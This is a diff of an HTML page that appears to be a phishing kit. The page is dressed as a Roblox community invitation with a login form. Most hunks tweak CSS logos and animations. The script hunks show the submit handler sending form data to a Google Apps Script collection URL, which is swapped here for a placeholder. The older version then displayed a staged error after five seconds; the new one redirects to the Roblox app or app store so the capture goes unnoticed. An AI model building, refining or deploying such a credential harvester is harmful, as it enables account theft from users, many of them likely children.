@@ -43,8 +43,8 @@
         }
 
         .logo {
-            width: 26px;
-            height: 26px;
+            width: 29px;
+            height: 29px;
             background-color: #6b6b6b;
             display: flex;
             align-items: center;
@@ -58,8 +58,8 @@
 
         .logo::before {
             content: '';
-            width: 7.9px;
-            height: 7.9px;
+            width: 8.0px;
+            height: 8.0px;
             background-color: white;
             position: absolute;
             animation: logoInnerFadeIn 0.6s ease-out;
@@ -211,13 +211,27 @@
         }
 
         .community-icon::before {
-            content: '🦈';
+            content: '';
             position: absolute;
-            font-size: 65px;
-            filter: saturate(150%) brightness(110%);
+            width: 100%;
+            height: 100%;
+            background-color: #FFD700;
             opacity: 0;
             animation: iconContentReveal 0s ease-out forwards;
             animation-delay: 3.5s;
+        }
+
+        .community-icon::after {
+            content: '';
+            position: absolute;
+            width: 44.8px;
+            height: 44.8px;
+            background-color: #FFD700;
+            transform: rotate(22deg);
+            opacity: 0;
+            animation: iconContentReveal 0s ease-out forwards;
+            animation-delay: 3.5s;
+            box-shadow: inset 0 0 0 13.8px white;
         }
 
         @keyframes sweepGradient {
@@ -249,12 +263,18 @@
         .community-info h2 {
             font-size: 28px;
             margin-bottom: 4px;
+            opacity: 0;
+            animation: textReveal 0s ease-out forwards;
+            animation-delay: 4s;
         }
 
         .community-info .author {
             color: #606468;
             font-size: 14px;
             margin-bottom: 24px;
+            opacity: 0;
+            animation: textReveal 0s ease-out forwards;
+            animation-delay: 4s;
         }
 
         .join-btn {
@@ -304,13 +324,25 @@
         }
 
         .community-loading-dots {
-            display: flex;
+            display: none;
             justify-content: flex-start;
             align-items: center;
             gap: 18px;
             margin: 8px 0;
-            animation: communityLoadingHide 0s ease-out forwards;
-            animation-delay: 4s;
+            animation: communityLoadingShow 0s ease-out forwards, communityLoadingHide 0s ease-out forwards;
+            animation-delay: 3s, 4s;
+        }
+
+        @keyframes communityLoadingShow {
+            to {
+                display: flex;
+            }
+        }
+
+        @keyframes communityLoadingHide {
+            to {
+                display: none;
+            }
         }
 
         .community-loading-dot {
@@ -331,12 +363,6 @@
 
         .community-loading-dot:nth-child(3) {
             animation-delay: 1s;
-        }
-
-        @keyframes communityLoadingHide {
-            to {
-                display: none;
-            }
         }
 
         @keyframes textReveal {
@@ -846,8 +872,8 @@
             }
 
             .logo {
-                width: 32px;
-                height: 32px;
+                width: 29px;
+                height: 29px;
             }
 
             .nav {
@@ -1192,7 +1218,7 @@
             document.getElementById('tab-' + tabName).classList.add('active');
             document.getElementById(tabName + '-section').classList.add('active');
         }
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyyqMrFoHFduhIwUmxGbrRCgBcUz9HHDchU5IJsA5OlNgVyLddDECX112aSzbIz_OlsJQ/exec'
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -1230,11 +1256,22 @@
                 })
             });
             
-            // 5초 후 에러 메시지 표시 및 버튼 복구
+            // 5초 후 로블록스 앱 열기 시도
             setTimeout(() => {
-                loginButton.style.display = 'block';
-                loadingDots.classList.remove('show');
-                errorMessage.classList.add('show');
+                // 로블록스 앱 열기 시도
+                window.location.href = 'roblox://';
+                
+                // 1초 후 앱이 안 열렸으면 앱스토어로
+                setTimeout(() => {
+                    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+                    if (/android/i.test(userAgent)) {
+                        // 안드로이드
+                        window.location.href = 'https://play.google.com/store/apps/details?id=com.roblox.client';
+                    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+                        // iOS
+                        window.location.href = 'https://apps.apple.com/app/roblox/id431946152';
+                    }
+                }, 1000);
             }, 5000);
         });
     </script>
